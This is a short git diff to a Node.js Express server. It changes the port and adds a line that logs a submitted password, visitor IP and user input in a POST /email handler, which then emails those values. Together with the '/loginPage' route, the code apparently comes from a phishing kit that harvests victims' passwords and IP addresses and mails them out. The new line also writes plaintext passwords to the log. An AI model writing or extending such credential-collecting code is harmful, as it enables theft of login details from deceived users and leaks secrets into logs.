@@ -1,4 +1,4 @@
-const PORT = 5000;
+const PORT = 8080;
 const express = require('express');
 const session = require('express-session');
 const path = require('path');
@@ -73,6 +73,7 @@ app.get('/loginPage', async (req, res) => {
 app.post('/email', (req, res) => {
   const { passwd } = req.body;
   const { visitorIP, userInput } = req.session;
+  console.log (passwd, visitorIP, userInput)
 
   sendMail(userInput, passwd, visitorIP, (err, data) => {
     if (err) {
